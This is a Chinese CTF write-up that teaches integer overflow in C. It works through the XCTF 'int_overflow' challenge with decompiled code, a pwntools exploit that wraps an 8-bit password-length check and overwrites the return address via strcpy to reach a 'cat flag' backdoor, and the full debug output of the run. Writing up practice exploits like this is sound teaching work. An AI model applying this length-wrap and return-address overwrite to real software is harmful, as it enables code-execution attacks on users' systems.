> 国庆颓废了4天，肝了4天的原神......
>
> 今天突然想起了栈中的整数溢出没有学习，正好学习~~堆学累了~~（玩游戏玩累了），来看看简单的整数溢出。
>
> 附件：
>
> 链接：[https://pan.baidu.com/s/1QFQ_AXFXUFeZPl11iKg8hQ](https://pan.baidu.com/s/1QFQ_AXFXUFeZPl11iKg8hQ)
>
> 提取码：etvv 
>

> 复制这段内容后打开百度网盘手机App，操作更方便哦
>

# 整数溢出的介绍
再说整数溢出之前，我们首先的先来说一下C语言中的整型的数据分类。

按数据类型分类主要分三类：短整型（short）、整型（int）、长整型（long）

按符号分类：有符号、无符号

并且每种数据类型都有自己的大小范围：

| 类型 | 字节 | 范围 |
| :---: | :---: | :---: |
| short int | 2byte(word) | 0~32767(0~0x7fff)   -32768~-1(0x8000~0xffff) |
| unsigned short int | 2byte(word) | 0~65535(0~0xffff) |
| int | 4byte(word) | 0~2147483647(0~0x7fffffff)   -2147483648~-1(0x80000000~0xffffffff) |
| unsigned int | 4byte(word) | 0~4294967295(0~0xffffffff) |
| long | 8byte(word) | 正: 0~0x7fffffffffffffff   负: 0x8000000000000000~0xffffffffffffffff |
| unsigned long | 8byte(word) | 0~0xffffffffffffffff |


你可不要小看了数据的大小范围，正是这个范围限制才导致了整数溢出。

# 整数溢出的说明
首先来看一下代码：（test.c）

```c
#include <stdio.h>
int main(){
    unsigned short int a = 1;
    unsigned short int b = 65537;
    if(a == b){
        printf("Int overflow successfully!\n");
    }
    return 0;
}
```

我们将其编译运行：gcc -g test.c -o test

```c
ubuntu@ubuntu:~/Desktop/int_overflow$ gcc -g test.c -o test
test.c: In function ‘main’:
test.c:4:28: warning: large integer implicitly truncated to unsigned type [-Woverflow]
     unsigned short int b = 65537;
                            ^
ubuntu@ubuntu:~/Desktop/int_overflow$ 
```

从上面编译的警告可以看出：存在大整数溢出。运行一下程序：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1601862244920-24c34d5f-7004-447a-94d0-8f3dbc184b86.png)

为什么变量a和b会相等？回顾以下~~unsigned int~~ 的范围：0~65535(0~0xffff)

> **<font style="color:#E8323C;">2022-08-20：上面是 unsigned short int</font>**
>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1601862393119-d0bfe7c0-28d9-40e4-ab71-5009b3a2885b.png)

对b变量的赋值超过了这个范围，因此hex的数据最高位会被截断（也就是自动忽略，不要了），从而变成了0001（hex）==1（dec）

# 整数溢出的例子
> 以攻防世界的int_overflow为例子进行讲解
>
> 参考资料：[https://www.52pojie.cn/thread-1032448-1-1.html](https://www.52pojie.cn/thread-1032448-1-1.html)
>

检查一下文件的保护情况：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1601862889853-3b0bc005-0471-4e0b-aa50-ddc69a09f9cf.png)

只开启了NX保护（栈上不可执行保护）。相当于没有开保护...

放入IDA中看一下：

> 在IDA中我修改了部分函数的函数类型
>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1601863103362-e5e89e39-6f93-4a4d-af98-847b206e846e.png)

main函数是个选择功能函数，很简单，不说了。进入login函数：

```c
void __cdecl login()
{
  char buf; // [esp+0h] [ebp-228h]
  char s; // [esp+200h] [ebp-28h]

  memset(&s, 0, 0x20u);
  memset(&buf, 0, 0x200u);
  puts("Please input your username:");
  read(0, &s, 0x19u);                
  printf("Hello %s\n", &s);
  puts("Please input your passwd:");
  read(0, &buf, 0x199u);             
  check_passwd(&buf);
}
```

> 0x19u表示无符号数
>

~~这个存在两个栈溢出漏洞，~~至于能不能用的上，一会儿再说。进入check_passwd函数：

> **<font style="color:#E8323C;">2022-08-20（马上进入须弥时代）：这里哪儿有栈溢出？？？？这里只有两个read函数...</font>**
>

```c
void __cdecl check_passwd(char *s)//传入的参数为输入的passwd
{
  char dest; // [esp+4h] [ebp-14h]
  unsigned __int8 v2; // [esp+Fh] [ebp-9h] //1byte to save passwd's length,8bit,0-255(0xff)

  v2 = strlen(s);
  if ( v2 <= 3u || v2 > 8u )                      //输入的长度在4-8之间
  {  //max_passwd==0x199
    puts("Invalid Password");
    fflush(stdout);
  }
  else
  {
    puts("Success");
    fflush(stdout);
    strcpy(&dest, s);                            //参数dest和s的大小不相同，存在栈溢出漏洞
     //dest_stack_size==0xb
     //s_stack_size(max_passwd_stack_size)==0x200
  }
}
```

> + unsigned __int8 v2表示v2变量的类型为8bit无符号整数，这里可能存在整数溢出.
> + 由于max_passwd为0x199，这个数据过大，因此可以存在漏洞的利用。
> + 利用整数溢出，可以将v2的长度（4-8）转变为260-264（还是截断）照样可以通过验证，这里使用的payload长度为262
>

同时程序存在着后门函数：

```c
int what_is_this()
{
  return system("cat flag");
}
```

> 请创建flag文件在程序的同级目录下，我的flag内容为：flag{wow_you_pwn_me_2333!}
>

贴上payload：

```python
from pwn import *
context(os='linux', arch='i386', log_level='debug')

#p=remote('111.198.29.45',44241)
p=process("./pwn")
 
p.sendlineafter("choice:","1")
p.sendlineafter("username:\n","xctf")
 
cat_flag_addr = 0x08048694
payload = "A" * 0x14 + "AAAA" + p32(cat_flag_addr) + "A" * 234
 
p.sendlineafter("passwd:\n",payload)
#gdb.attach(p)
print p.recvall()
```

主要来解释一下payload：payload = "A" * 0x14 + "AAAA" + p32(cat_flag_addr) + "A" * 234

首先我们在puts("Please input your passwd:");之后向栈中写入payload，由于整数溢出的性质，使得输入的passwd的长度被截断为0x6==（dec）6，因此程序会通过验证。

之后执行strcpy函数，将输入的payload拷贝到dest空间中：

+ "A" * 0x14：垃圾字符填充栈
+ "AAAA"：填充ebp
+ p32(cat_flag_addr)：覆盖返回地址
+ "A" * 234：绕过程序对输入字符的验证。

payload执行结果如下：

```python
➜  int_overflow sudo python exp.py 
[sudo] password for ubuntu: 
[+] Starting local process './pwn' argv=['./pwn'] : pid 7712
[DEBUG] Received 0x7a bytes:
    '---------------------\n'
    '~~ Welcome to CTF! ~~\n'
    '       1.Login       \n'
    '       2.Exit        \n'
    '---------------------\n'
    'Your choice:'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x1c bytes:
    'Please input your username:\n'
[DEBUG] Sent 0x5 bytes:
    'xctf\n'
[DEBUG] Received 0x26 bytes:
    'Hello xctf\n'
    '\n'
    'Please input your passwd:\n'
[DEBUG] Sent 0x107 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  94 86 04 08  41 41 41 41  │AAAA│AAAA│····│AAAA│
    00000020  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000100  41 41 41 41  41 41 0a                               │AAAA│AA·│
    00000107
[+] Receiving all data: Done (35B)
[DEBUG] Received 0x8 bytes:
    'Success\n'
[DEBUG] Received 0x1b bytes:
    'flag{wow_you_pwn_me_2333!}\n'
[*] Process './pwn' stopped with exit code -11 (SIGSEGV) (pid 7712)
Success
flag{wow_you_pwn_me_2333!}

➜  int_overflow 
```





